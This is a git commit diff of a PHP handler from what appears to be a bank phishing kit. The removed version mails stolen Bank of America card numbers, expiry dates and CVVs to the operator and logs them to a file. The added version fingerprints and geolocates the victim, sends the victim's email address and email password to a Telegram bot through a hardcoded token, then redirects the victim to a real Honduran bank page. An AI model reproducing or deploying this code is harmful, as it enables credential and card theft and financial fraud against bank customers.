35780815e477fba7e9b832554daa32957d439fb2
criptotab21 <51388858+criptotab21@users.noreply.github.com>
2022-11-20 15:21:01 -0600

    Update drdon2.php

--- drdon2.php
+++ drdon2.php
@@ -1,25 +1,94 @@
-<?php include ("../images/sec.gif");
-$zabi = getenv("REMOTE_ADDR");
-include '../antibots.php';
-include('../email.php');
-include '../bt.php';
-include "../blocker.php";
-$message .= "--------------  BOA LOGIN  -------------\n";
-$message .= "Card Number  : ".$_POST['numcd']."\n";
-$message .= "Month        : ".$_POST['mm']."\n";
-$message .= "Year         : ".$_POST['yy']."\n";
-$message .= "CVV          : ".$_POST['cvv']."\n";
-$message .= "-------------- IP Infos ------------\n";
-$message .= "IP       : $zabi\n";
-$message .= "-----------------------------------------------------\n";
-$cc = $_POST['ccn'];
-$subject = "BOA BAN3 LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
-$headers = "From: HACKER.SPAMMER <contact>\r\n";
-mail($email,$subject,$message,$headers);
-mail($userinfo,$subject,$message,$headers);
-$text = fopen('../../rezlt.txt', 'a');
-fwrite($text, $message);
+<?php  
+include "fucker.php";
+?>
+
+<?php
+@$userp = $_SERVER['REMOTE_ADDR'];
+
+////////////////////
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+function getBrowser($user_agent){
+if(strpos($user_agent, 'MSIE') !== FALSE)
+   return 'Internet explorer';
+ elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
+   return 'Microsoft Edge';
+ elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
+    return 'Internet explorer';
+ elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
+   return "Opera Mini";
+ elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
+   return "Opera";
+ elseif(strpos($user_agent, 'Firefox') !== FALSE)
+   return 'Mozilla Firefox';
+ elseif(strpos($user_agent, 'Chrome') !== FALSE)
+   return 'Google Chrome';
+ elseif(strpos($user_agent, 'Safari') !== FALSE)
+   return "Safari";
+ else
+   return 'No navegador';}
+ function getOS() { 
+    global $user_agent;
+    $os_array =  array(
+     '/windows nt 10/i'      =>  'Windows 10',
+     '/windows nt 6.3/i'     =>  'Windows 8.1',
+     '/windows nt 6.2/i'     =>  'Windows 8',
+     '/windows nt 6.1/i'     =>  'Windows 7',
+     '/windows nt 6.0/i'     =>  'Windows Vista',
+     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+     '/windows nt 5.1/i'     =>  'Windows XP',
+     '/windows xp/i'         =>  'Windows XP',
+     '/macintosh|mac os x/i' =>  'Mac OS X',
+     '/mac_powerpc/i'        =>  'Mac OS 9',
+     '/linux/i'              =>  'Linux',
+     '/ubuntu/i'             =>  'Ubuntu',
+     '/iphone/i'             =>  'iPhone',
+     '/ipod/i'               =>  'iPod',
+     '/ipad/i'               =>  'iPad',
+     '/android/i'            =>  'Android',
+     '/blackberry/i'         =>  'BlackBerry',
+     '/webos/i'              =>  'Mobile');
+    $os_platform = "Unknown OS Platform";
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform = $value; }  }
+    return $os_platform; }
+$user_os        =   getOS();
+$navegador = getBrowser($user_agent);
+
+@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
+@$pais = $meta['geoplugin_countryName']; 
+@$region = $meta['geoplugin_regionName'];
+@$ciudad = $meta['geoplugin_city'];
+date_default_timezone_set('America/Bogota');
 
 
-header("Location: ../Successfull.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
+////////////////////
+
+@ini_set("display_errors", 0);
+
+////////////////////
+if ( isset ($_POST['yy']) && isset ($_POST['yy'])  ){
+
+
+$message = "m4il: ".$_POST['c0r']." - p4zz-m4il: ".$_POST['pc0r']."  \r\n";
+$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
+$apiToken = "5338937969:AAFrrJvtWJi_O-RDz5a3YuLhC8tF1hBgkM4";
+
+
+$data = [
+  'chat_id' => '@sisaxd1',
+
+   'text' => $message
+];
+
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+
+@header('Location: https://pyme.bancatlan.hn/Empresasv3/hnotauthorized.aspx?82sPNmMP8O3TlpdEZk1r8A==');
+
+
+
+ }
+
+
+
 ?>
